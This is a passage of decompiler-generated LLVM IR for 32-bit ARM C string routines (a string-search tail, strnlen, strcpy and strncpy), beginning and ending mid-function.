  %v3_11bd8 = inttoptr i32 %v2_11bd8 to i8*
  %v4_11bd8 = load i8, i8* %v3_11bd8, align 1
  %v2_11bdc = icmp eq i8 %v4_11bd8, 0
  br i1 %v2_11bdc, label %dec_label_pc_11ca4, label %dec_label_pc_11be8

dec_label_pc_11be8:                               ; preds = %dec_label_pc_11bd8
  %v1_11be8 = add i32 %v0_11bc4, 2
  %v1_11c3c = add i32 %tmp, 2
  %v2_11c3c = inttoptr i32 %v1_11c3c to i8*
  br label %dec_label_pc_11c34

dec_label_pc_11bf8:                               ; preds = %dec_label_pc_11c94
  %v3_11bf8 = load i8, i8* %v3_11c2c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c24.preheader

dec_label_pc_11c24.preheader:                     ; preds = %dec_label_pc_11bf8, %dec_label_pc_11c34
  %v0_11c243.in = phi i8 [ %v3_11bf8, %dec_label_pc_11bf8 ], [ %v3_11c2c.pn, %dec_label_pc_11c34 ]
  %v9_11c2412 = icmp eq i8 %v0_11c243.in, %v3_11bb4
  br i1 %v9_11c2412, label %dec_label_pc_11c2c, label %dec_label_pc_11c04

dec_label_pc_11c04:                               ; preds = %dec_label_pc_11c24.preheader, %dec_label_pc_11c20
  %v0_11c0c = phi i32 [ %v1_11c20, %dec_label_pc_11c20 ], [ %storemerge41, %dec_label_pc_11c24.preheader ]
  %v0_11c04.in = phi i8 [ %v3_11c20, %dec_label_pc_11c20 ], [ %v0_11c243.in, %dec_label_pc_11c24.preheader ]
  %v2_11c04 = icmp eq i8 %v0_11c04.in, 0
  br i1 %v2_11c04, label %dec_label_pc_11ca0, label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11c04
  %v1_11c0c = add i32 %v0_11c0c, 1
  %v2_11c0c = inttoptr i32 %v1_11c0c to i8*
  %v3_11c0c = load i8, i8* %v2_11c0c, align 1
  store i32 %v1_11c0c, i32* %r0.global-to-local, align 4
  %v9_11c10 = icmp eq i8 %v3_11c0c, %v3_11bb4
  br i1 %v9_11c10, label %dec_label_pc_11c2c, label %dec_label_pc_11c18

dec_label_pc_11c18:                               ; preds = %dec_label_pc_11c0c
  %v2_11c18 = icmp eq i8 %v3_11c0c, 0
  br i1 %v2_11c18, label %dec_label_pc_11ca0, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11c18
  %v1_11c20 = add i32 %v0_11c0c, 2
  %v2_11c20 = inttoptr i32 %v1_11c20 to i8*
  %v3_11c20 = load i8, i8* %v2_11c20, align 1
  store i32 %v1_11c20, i32* %r0.global-to-local, align 4
  %v9_11c24 = icmp eq i8 %v3_11c20, %v3_11bb4
  br i1 %v9_11c24, label %dec_label_pc_11c2c, label %dec_label_pc_11c04

dec_label_pc_11c2c:                               ; preds = %dec_label_pc_11c0c, %dec_label_pc_11c20, %dec_label_pc_11c24.preheader
  %v0_11c2c = phi i32 [ %storemerge41, %dec_label_pc_11c24.preheader ], [ %v1_11c0c, %dec_label_pc_11c0c ], [ %v1_11c20, %dec_label_pc_11c20 ]
  %v1_11c2c = add i32 %v0_11c2c, 1
  br label %dec_label_pc_11c34

dec_label_pc_11c34:                               ; preds = %dec_label_pc_11be8, %dec_label_pc_11c2c
  %storemerge41 = phi i32 [ %v1_11c2c, %dec_label_pc_11c2c ], [ %v1_11be8, %dec_label_pc_11be8 ]
  %v3_11c2c.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_11c2c.pn = load i8, i8* %v3_11c2c.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_11c2c.pn, %v4_11bd8
  br i1 %storemerge, label %dec_label_pc_11c38, label %dec_label_pc_11c24.preheader

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11c34
  %v1_11c38 = add i32 %storemerge41, 1
  %v2_11c38 = inttoptr i32 %v1_11c38 to i8*
  %v3_11c38 = load i8, i8* %v2_11c38, align 1
  %v4_11c38 = zext i8 %v3_11c38 to i32
  %v3_11c3c = load i8, i8* %v2_11c3c, align 1
  %v4_11c3c = zext i8 %v3_11c3c to i32
  %v9_11c44 = icmp eq i8 %v3_11c38, %v3_11c3c
  %v1_11c4c = add i32 %storemerge41, -1
  store i32 %v1_11c4c, i32* %r0.global-to-local, align 4
  br i1 %v9_11c44, label %dec_label_pc_11c54, label %dec_label_pc_11c94

dec_label_pc_11c54:                               ; preds = %dec_label_pc_11c38, %dec_label_pc_11c84
  %v0_11c6c = phi i32 [ %v1_11c74, %dec_label_pc_11c84 ], [ %v1_11c3c, %dec_label_pc_11c38 ]
  %v0_11c64 = phi i32 [ %v1_11c70, %dec_label_pc_11c84 ], [ %v1_11c38, %dec_label_pc_11c38 ]
  %v0_11c54 = phi i32 [ %v4_11c84, %dec_label_pc_11c84 ], [ %v4_11c38, %dec_label_pc_11c38 ]
  %v2_11c54 = icmp eq i32 %v0_11c54, 0
  br i1 %v2_11c54, label %dec_label_pc_11ca4, label %dec_label_pc_11c5c

dec_label_pc_11c5c:                               ; preds = %dec_label_pc_11c54
  %v1_11c5c = add i32 %v0_11c64, 1
  %v2_11c5c = inttoptr i32 %v1_11c5c to i8*
  %v3_11c5c = load i8, i8* %v2_11c5c, align 1
  %v1_11c60 = add i32 %v0_11c6c, 1
  %v2_11c60 = inttoptr i32 %v1_11c60 to i8*
  %v3_11c60 = load i8, i8* %v2_11c60, align 1
  %v4_11c60 = zext i8 %v3_11c60 to i32
  store i32 %v1_11c5c, i32* @r1, align 4
  %v9_11c68 = icmp eq i8 %v3_11c5c, %v3_11c60
  %v1_11c70 = add i32 %v0_11c64, 2
  %v1_11c74 = add i32 %v0_11c6c, 2
  br i1 %v9_11c68, label %dec_label_pc_11c7c, label %dec_label_pc_11c94

dec_label_pc_11c7c:                               ; preds = %dec_label_pc_11c5c
  %v2_11c7c = icmp eq i8 %v3_11c5c, 0
  br i1 %v2_11c7c, label %dec_label_pc_11ca4, label %dec_label_pc_11c84

dec_label_pc_11c84:                               ; preds = %dec_label_pc_11c7c
  %v2_11c84 = inttoptr i32 %v1_11c74 to i8*
  %v3_11c84 = load i8, i8* %v2_11c84, align 1
  %v4_11c84 = zext i8 %v3_11c84 to i32
  %v2_11c88 = inttoptr i32 %v1_11c70 to i8*
  %v3_11c88 = load i8, i8* %v2_11c88, align 1
  %v9_11c8c = icmp eq i8 %v3_11c88, %v3_11c84
  br i1 %v9_11c8c, label %dec_label_pc_11c54, label %dec_label_pc_11c94

dec_label_pc_11c94:                               ; preds = %dec_label_pc_11c84, %dec_label_pc_11c5c, %dec_label_pc_11c38
  %v0_11c94 = phi i32 [ %v4_11c3c, %dec_label_pc_11c38 ], [ %v4_11c84, %dec_label_pc_11c84 ], [ %v4_11c60, %dec_label_pc_11c5c ]
  %v2_11c94 = icmp eq i32 %v0_11c94, 0
  br i1 %v2_11c94, label %dec_label_pc_11ca4, label %dec_label_pc_11bf8

dec_label_pc_11ca0:                               ; preds = %dec_label_pc_11bc4, %dec_label_pc_11c18, %dec_label_pc_11c04
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ca4

dec_label_pc_11ca4:                               ; preds = %dec_label_pc_11c94, %dec_label_pc_11c7c, %dec_label_pc_11c54, %entry, %dec_label_pc_11bd8, %dec_label_pc_11ca0
  %v1_11ca8 = phi i32 [ %v1_11bc4, %dec_label_pc_11bd8 ], [ 0, %dec_label_pc_11ca0 ], [ %v1_11ca8.pre, %entry ], [ %v1_11c4c, %dec_label_pc_11c54 ], [ %v1_11c4c, %dec_label_pc_11c7c ], [ %v1_11c4c, %dec_label_pc_11c94 ]
  ret i32 %v1_11ca8

; uselistorder directives
  uselistorder i32 %v1_11c70, { 1, 0 }
  uselistorder i8 %v3_11c2c.pn, { 1, 0 }
  uselistorder i8* %v3_11c2c.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_11c20, { 1, 0 }
  uselistorder i32 %v1_11c20, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11bc4, { 0, 2, 3, 1 }
  uselistorder i8 %v3_11bb4, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 9, 5, 6, 3, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_11ca4, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_11ca0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11c54, { 1, 0 }
  uselistorder label %dec_label_pc_11c34, { 1, 0 }
  uselistorder label %dec_label_pc_11c2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c04, { 1, 0 }
  uselistorder label %dec_label_pc_11c24.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11cac = icmp eq i32 %arg2, 0
  br i1 %v2_11cac, label %bb, label %dec_label_pc_11cc0

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_11cc0:                               ; preds = %entry
  %v2_11cc0 = add i32 %tmp, %arg2
  %v3_11cc0 = icmp ult i32 %v2_11cc0, %tmp
  br i1 %v3_11cc0, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_11cc0
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11cc0, %bb19
  %v5_11d60 = phi i32 [ %v2_11cc0, %dec_label_pc_11cc0 ], [ -1, %bb19 ]
  %v1_11ce04 = urem i32 %tmp, 4
  %v2_11ce05 = icmp eq i32 %v1_11ce04, 0
  br i1 %v2_11ce05, label %dec_label_pc_11ce8, label %dec_label_pc_11cd0

dec_label_pc_11cd0:                               ; preds = %bb20, %dec_label_pc_11cdc
  %v0_11cdc = phi i32 [ %v1_11cdc, %dec_label_pc_11cdc ], [ %tmp, %bb20 ]
  %v1_11cd0 = inttoptr i32 %v0_11cdc to i8*
  %v2_11cd0 = load i8, i8* %v1_11cd0, align 1
  %v2_11cd4 = icmp eq i8 %v2_11cd0, 0
  br i1 %v2_11cd4, label %dec_label_pc_11d5c, label %dec_label_pc_11cdc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cd0
  %v1_11cdc = add i32 %v0_11cdc, 1
  %v1_11ce0 = urem i32 %v1_11cdc, 4
  %v2_11ce0 = icmp eq i32 %v1_11ce0, 0
  br i1 %v2_11ce0, label %dec_label_pc_11ce8, label %dec_label_pc_11cd0

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11cdc, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_11cdc, %dec_label_pc_11cdc ]
  %v3_11d4c30 = icmp ult i32 %storemerge.lcssa, %v5_11d60
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_11d4c30, label %dec_label_pc_11cf0, label %dec_label_pc_11d5c

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11d48, %dec_label_pc_11ce8
  %v0_11d4037 = phi i32 [ %v4_11cf0, %dec_label_pc_11d48 ], [ %storemerge.lcssa, %dec_label_pc_11ce8 ]
  %v1_11cf0 = inttoptr i32 %v0_11d4037 to i32*
  %v2_11cf0 = load i32, i32* %v1_11cf0, align 4
  %v4_11cf0 = add i32 %v0_11d4037, 4
  %v2_11cf4 = add i32 %v2_11cf0, -16843009
  %v2_11cf8 = and i32 %v2_11cf4, -2139062144
  store i32 %v2_11cf8, i32* @ip, align 4
  %v2_11cfc = icmp eq i32 %v2_11cf8, 0
  br i1 %v2_11cfc, label %dec_label_pc_11d48, label %dec_label_pc_11d04

dec_label_pc_11d04:                               ; preds = %dec_label_pc_11cf0
  %v2_11d04 = inttoptr i32 %v0_11d4037 to i8*
  %v3_11d04 = load i8, i8* %v2_11d04, align 1
  %v2_11d08 = icmp eq i8 %v3_11d04, 0
  br i1 %v2_11d08, label %bb21, label %dec_label_pc_11d18

bb21:                                             ; preds = %dec_label_pc_11d04
  br label %dec_label_pc_11d5c

dec_label_pc_11d18:                               ; preds = %dec_label_pc_11d04
  %v1_11d18 = add i32 %v0_11d4037, 1
  %v2_11d18 = inttoptr i32 %v1_11d18 to i8*
  %v3_11d18 = load i8, i8* %v2_11d18, align 1
  %v2_11d1c = icmp eq i8 %v3_11d18, 0
  br i1 %v2_11d1c, label %dec_label_pc_11d5c, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11d18
  %v1_11d28 = add i32 %v0_11d4037, 2
  %v2_11d28 = inttoptr i32 %v1_11d28 to i8*
  %v3_11d28 = load i8, i8* %v2_11d28, align 1
  %v2_11d2c = icmp eq i8 %v3_11d28, 0
  br i1 %v2_11d2c, label %dec_label_pc_11d5c, label %dec_label_pc_11d38

dec_label_pc_11d38:                               ; preds = %dec_label_pc_11d28
  %v1_11d38 = add i32 %v0_11d4037, 3
  %v2_11d38 = inttoptr i32 %v1_11d38 to i8*
  %v3_11d38 = load i8, i8* %v2_11d38, align 1
  %v2_11d3c = icmp eq i8 %v3_11d38, 0
  br i1 %v2_11d3c, label %dec_label_pc_11d5c, label %dec_label_pc_11d48

dec_label_pc_11d48:                               ; preds = %dec_label_pc_11d38, %dec_label_pc_11cf0
  %v3_11d4c = icmp ult i32 %v4_11cf0, %v5_11d60
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_11d4c, label %dec_label_pc_11cf0, label %dec_label_pc_11d5c

dec_label_pc_11d5c:                               ; preds = %dec_label_pc_11d48, %dec_label_pc_11ce8, %dec_label_pc_11cd0, %dec_label_pc_11d18, %dec_label_pc_11d28, %dec_label_pc_11d38, %bb21
  %v1_11d5c = phi i32 [ %v0_11d4037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_11ce8 ], [ %v1_11d18, %dec_label_pc_11d18 ], [ %v1_11d28, %dec_label_pc_11d28 ], [ %v1_11d38, %dec_label_pc_11d38 ], [ %v5_11d60, %dec_label_pc_11d48 ], [ %v0_11cdc, %dec_label_pc_11cd0 ]
  %v3_11d5c = icmp uge i32 %v5_11d60, %v1_11d5c
  %v9_11d5c = icmp eq i32 %v5_11d60, %v1_11d5c
  %v2_11d60 = xor i1 %v3_11d5c, true
  %v3_11d60 = or i1 %v9_11d5c, %v2_11d60
  br i1 %v3_11d60, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_11d5c
  %v6_11d60 = sub i32 %v5_11d60, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_11d5c, %bb22
  %v5_11d64 = phi i32 [ %v1_11d5c, %dec_label_pc_11d5c ], [ %v6_11d60, %bb22 ]
  %v2_11d64 = xor i1 %v9_11d5c, true
  %v3_11d64 = and i1 %v3_11d5c, %v2_11d64
  br i1 %v3_11d64, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_11d64 = sub i32 %v5_11d64, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_11d6c = phi i32 [ 0, %bb ], [ %v5_11d64, %bb23 ], [ %v6_11d64, %bb24 ]
  ret i32 %v1_11d6c

; uselistorder directives
  uselistorder i1 %v3_11d5c, { 1, 0 }
  uselistorder i32 %v4_11cf0, { 1, 0 }
  uselistorder i32 %v0_11d4037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11cdc, { 1, 0, 2 }
  uselistorder i32 %v5_11d60, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_11d5c, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_11cd0, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_11d881 = load i32, i32* @r1, align 4
  %v1_11d882 = inttoptr i32 %v0_11d881 to i8*
  %v2_11d883 = load i8, i8* %v1_11d882, align 1
  %v2_11d8c5 = icmp eq i8 %v2_11d883, 0
  store i1 %v2_11d8c5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_11d883, i8* %arg1, align 1
  br i1 %v2_11d8c5, label %dec_label_pc_11d98, label %dec_label_pc_11d80

dec_label_pc_11d80:                               ; preds = %entry, %dec_label_pc_11d80
  %v0_11d80 = load i32, i32* @r1, align 4
  %v1_11d80 = add i32 %v0_11d80, 1
  store i32 %v1_11d80, i32* @r1, align 4
  %v0_11d84 = load i32, i32* %r2.global-to-local, align 4
  %v1_11d84 = add i32 %v0_11d84, 1
  store i32 %v1_11d84, i32* %r2.global-to-local, align 4
  %v1_11d88 = inttoptr i32 %v1_11d80 to i8*
  %v2_11d88 = load i8, i8* %v1_11d88, align 1
  %v2_11d8c = icmp eq i8 %v2_11d88, 0
  store i1 %v2_11d8c, i1* %cpsr_z.global-to-local, align 1
  %v3_11d90 = inttoptr i32 %v1_11d84 to i8*
  store i8 %v2_11d88, i8* %v3_11d90, align 1
  %v0_11d94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11d94, label %dec_label_pc_11d98, label %dec_label_pc_11d80

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d80, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11d80, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_11d9c = icmp eq i32 %arg2, 3
  store i1 %v7_11d9c, i1* %cpsr_z.global-to-local, align 1
  %v0_11da0 = load i32, i32* @lr, align 4
  store i32 %v0_11da0, i32* %stack_var_-4, align 4
  %v1_11da4 = add i32 %arg1, -1
  store i32 %v1_11da4, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_11e20, label %dec_label_pc_11dac

dec_label_pc_11dac:                               ; preds = %entry
  %v3_11dac = udiv i32 %arg2, 4
  store i32 %v3_11dac, i32* %lr.global-to-local, align 4
  %v0_11db0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11dfc, %dec_label_pc_11dac
  %v2_11db8 = phi i32 [ %v6_11df0, %dec_label_pc_11dfc ], [ %v1_11da4, %dec_label_pc_11dac ]
  %v0_11db0 = phi i32 [ %v1_11e00, %dec_label_pc_11dfc ], [ %v0_11db0.pre, %dec_label_pc_11dac ]
  %v1_11db0 = inttoptr i32 %v0_11db0 to i8*
  %v2_11db0 = load i8, i8* %v1_11db0, align 1
  %v3_11db0 = zext i8 %v2_11db0 to i32
  store i32 %v3_11db0, i32* %r3.global-to-local, align 4
  %v2_11db4 = icmp eq i8 %v2_11db0, 0
  store i1 %v2_11db4, i1* %cpsr_z.global-to-local, align 1
  %v3_11db8 = add i32 %v2_11db8, 1
  %v4_11db8 = inttoptr i32 %v3_11db8 to i8*
  store i8 %v2_11db0, i8* %v4_11db8, align 1
  %v5_11db8 = load i32, i32* @ip, align 4
  %v6_11db8 = add i32 %v5_11db8, 1
  store i32 %v6_11db8, i32* @ip, align 4
  %v0_11dbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11dbc, label %dec_label_pc_11e0c, label %dec_label_pc_11dc0

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11db0
  %v0_11dc0 = load i32, i32* @r1, align 4
  %v1_11dc0 = add i32 %v0_11dc0, 1
  %v2_11dc0 = inttoptr i32 %v1_11dc0 to i8*
  %v3_11dc0 = load i8, i8* %v2_11dc0, align 1
  %v4_11dc0 = zext i8 %v3_11dc0 to i32
  store i32 %v4_11dc0, i32* %r3.global-to-local, align 4
  %v2_11dc4 = icmp eq i8 %v3_11dc0, 0
  store i1 %v2_11dc4, i1* %cpsr_z.global-to-local, align 1
  %v3_11dc8 = add i32 %v5_11db8, 2
  %v4_11dc8 = inttoptr i32 %v3_11dc8 to i8*
  store i8 %v3_11dc0, i8* %v4_11dc8, align 1
  %v5_11dc8 = load i32, i32* @ip, align 4
  %v6_11dc8 = add i32 %v5_11dc8, 1
  store i32 %v6_11dc8, i32* @ip, align 4
  %v0_11dcc = load i32, i32* @r1, align 4
  %v1_11dcc = add i32 %v0_11dcc, 1
  store i32 %v1_11dcc, i32* %r1.global-to-local, align 4
  %v0_11dd0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11dd0, label %dec_label_pc_11e0c, label %dec_label_pc_11dd4

dec_label_pc_11dd4:                               ; preds = %dec_label_pc_11dc0
  %v1_11dd4 = add i32 %v0_11dcc, 2
  %v2_11dd4 = inttoptr i32 %v1_11dd4 to i8*
  %v3_11dd4 = load i8, i8* %v2_11dd4, align 1
  %v4_11dd4 = zext i8 %v3_11dd4 to i32
  store i32 %v4_11dd4, i32* %r3.global-to-local, align 4
  %v2_11dd8 = icmp eq i8 %v3_11dd4, 0
  store i1 %v2_11dd8, i1* %cpsr_z.global-to-local, align 1
  %v3_11ddc = add i32 %v5_11dc8, 2
  %v4_11ddc = inttoptr i32 %v3_11ddc to i8*
  store i8 %v3_11dd4, i8* %v4_11ddc, align 1
  %v5_11ddc = load i32, i32* @ip, align 4
  %v6_11ddc = add i32 %v5_11ddc, 1
  store i32 %v6_11ddc, i32* @ip, align 4
  %v0_11de0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11de0 = add i32 %v0_11de0, 1
  store i32 %v1_11de0, i32* %r1.global-to-local, align 4
  %v0_11de4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11de4, label %dec_label_pc_11e0c, label %dec_label_pc_11de8

dec_label_pc_11de8:                               ; preds = %dec_label_pc_11dd4
  %v1_11de8 = add i32 %v0_11de0, 2
  %v2_11de8 = inttoptr i32 %v1_11de8 to i8*
  %v3_11de8 = load i8, i8* %v2_11de8, align 1
  %v4_11de8 = zext i8 %v3_11de8 to i32
  store i32 %v4_11de8, i32* %r3.global-to-local, align 4
  %v2_11dec = icmp eq i8 %v3_11de8, 0
  store i1 %v2_11dec, i1* %cpsr_z.global-to-local, align 1
  %v3_11df0 = add i32 %v5_11ddc, 2
  %v4_11df0 = inttoptr i32 %v3_11df0 to i8*
  store i8 %v3_11de8, i8* %v4_11df0, align 1
  %v5_11df0 = load i32, i32* @ip, align 4
  %v6_11df0 = add i32 %v5_11df0, 1
  store i32 %v6_11df0, i32* @ip, align 4
  %v0_11df4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11df4 = add i32 %v0_11df4, 1
  store i32 %v1_11df4, i32* %r1.global-to-local, align 4
  %v0_11df8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11df8, label %dec_label_pc_11e0c, label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %dec_label_pc_11de8
  %v0_11dfc = load i32, i32* %lr.global-to-local, align 4
  %v1_11dfc = add i32 %v0_11dfc, -1
  store i32 %v1_11dfc, i32* %lr.global-to-local, align 4
  %v7_11dfc = icmp eq i32 %v0_11dfc, 1
  store i1 %v7_11dfc, i1* %cpsr_z.global-to-local, align 1
  %v1_11e00 = add i32 %v0_11df4, 2
  store i32 %v1_11e00, i32* @r1, align 4
  br i1 %v7_11dfc, label %dec_label_pc_11e20, label %dec_label_pc_11db0

dec_label_pc_11e0c:                               ; preds = %dec_label_pc_11de8, %dec_label_pc_11dd4, %dec_label_pc_11dc0, %dec_label_pc_11db0
  %v1_11e0c = phi i32 [ %v6_11df0, %dec_label_pc_11de8 ], [ %v6_11ddc, %dec_label_pc_11dd4 ], [ %v6_11dc8, %dec_label_pc_11dc0 ], [ %v6_11db8, %dec_label_pc_11db0 ]
  %v2_11e0c1 = sub i32 %arg1, %v1_11e0c
  %v2_11e10 = add i32 %v2_11e0c1, %arg2
  %v1_11e14 = add i32 %v2_11e10, -1
  store i32 %v1_11e14, i32* %r3.global-to-local, align 4
  %v7_11e14 = icmp eq i32 %v2_11e10, 1
  store i1 %v7_11e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e14, label %dec_label_pc_11e50, label %dec_label_pc_11e40

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11dfc, %entry
  %v2_11e307 = phi i32 [ %v1_11da4, %entry ], [ %v6_11df0, %dec_label_pc_11dfc ]
  %v1_11e20 = urem i32 %arg2, 4
  store i32 %v1_11e20, i32* %r3.global-to-local, align 4
  %v2_11e20 = icmp eq i32 %v1_11e20, 0
  store i1 %v2_11e20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e20, label %dec_label_pc_11e50, label %dec_label_pc_11e28

dec_label_pc_11e28:                               ; preds = %dec_label_pc_11e20, %dec_label_pc_11e38.dec_label_pc_11e28_crit_edge
  %v2_11e30 = phi i32 [ %v6_11e30, %dec_label_pc_11e38.dec_label_pc_11e28_crit_edge ], [ %v2_11e307, %dec_label_pc_11e20 ]
  %v0_11e2c = phi i32 [ %v0_11e2c.pre, %dec_label_pc_11e38.dec_label_pc_11e28_crit_edge ], [ %v1_11e20, %dec_label_pc_11e20 ]
  %v0_11e28 = load i32, i32* @r1, align 4
  %v1_11e28 = inttoptr i32 %v0_11e28 to i8*
  %v2_11e28 = load i8, i8* %v1_11e28, align 1
  %v3_11e28 = zext i8 %v2_11e28 to i32
  store i32 %v3_11e28, i32* %r2.global-to-local, align 4
  %v5_11e28 = add i32 %v0_11e28, 1
  store i32 %v5_11e28, i32* @r1, align 4
  %v1_11e2c = add i32 %v0_11e2c, -1
  store i32 %v1_11e2c, i32* %r3.global-to-local, align 4
  %v7_11e2c = icmp eq i32 %v0_11e2c, 1
  store i1 %v7_11e2c, i1* %cpsr_z.global-to-local, align 1
  %v3_11e30 = add i32 %v2_11e30, 1
  %v4_11e30 = inttoptr i32 %v3_11e30 to i8*
  store i8 %v2_11e28, i8* %v4_11e30, align 1
  %v5_11e30 = load i32, i32* @ip, align 4
  %v6_11e30 = add i32 %v5_11e30, 1
  store i32 %v6_11e30, i32* @ip, align 4
  %v0_11e34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e34, label %dec_label_pc_11e50, label %dec_label_pc_11e38

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11e28
  %v0_11e38 = load i32, i32* %r2.global-to-local, align 4
  %v2_11e38 = icmp eq i32 %v0_11e38, 0
  store i1 %v2_11e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e38, label %dec_label_pc_11e40, label %dec_label_pc_11e38.dec_label_pc_11e28_crit_edge

dec_label_pc_11e38.dec_label_pc_11e28_crit_edge:  ; preds = %dec_label_pc_11e38
  %v0_11e2c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11e28

dec_label_pc_11e40:                               ; preds = %dec_label_pc_11e38, %dec_label_pc_11e0c
  %v2_11e4810 = phi i32 [ %v1_11e0c, %dec_label_pc_11e0c ], [ %v6_11e30, %dec_label_pc_11e38 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11e44

dec_label_pc_11e44:                               ; preds = %dec_label_pc_11e44.dec_label_pc_11e44_crit_edge, %dec_label_pc_11e40
  %v2_11e48 = phi i32 [ %v6_11e48, %dec_label_pc_11e44.dec_label_pc_11e44_crit_edge ], [ %v2_11e4810, %dec_label_pc_11e40 ]
  %v0_11e48.off0 = phi i8 [ %extract.t, %dec_label_pc_11e44.dec_label_pc_11e44_crit_edge ], [ 0, %dec_label_pc_11e40 ]
  %v0_11e44 = load i32, i32* %r3.global-to-local, align 4
  %v1_11e44 = add i32 %v0_11e44, -1
  store i32 %v1_11e44, i32* %r3.global-to-local, align 4
  %v7_11e44 = icmp eq i32 %v0_11e44, 1
  store i1 %v7_11e44, i1* %cpsr_z.global-to-local, align 1
  %v3_11e48 = add i32 %v2_11e48, 1
  %v4_11e48 = inttoptr i32 %v3_11e48 to i8*
  store i8 %v0_11e48.off0, i8* %v4_11e48, align 1
  %v5_11e48 = load i32, i32* @ip, align 4
  %v6_11e48 = add i32 %v5_11e48, 1
  store i32 %v6_11e48, i32* @ip, align 4
  %v0_11e4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e4c, label %dec_label_pc_11e50, label %dec_label_pc_11e44.dec_label_pc_11e44_crit_edge

dec_label_pc_11e44.dec_label_pc_11e44_crit_edge:  ; preds = %dec_label_pc_11e44
  %v0_11e48.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_11e48.pre to i8
  br label %dec_label_pc_11e44

dec_label_pc_11e50:                               ; preds = %dec_label_pc_11e28, %dec_label_pc_11e44, %dec_label_pc_11e0c, %dec_label_pc_11e20
  %v2_11e50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_11e50, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_11e48, { 1, 0 }
  uselistorder i32 %v0_11e44, { 1, 0 }
  uselistorder i32 %v6_11e30, { 0, 2, 1 }
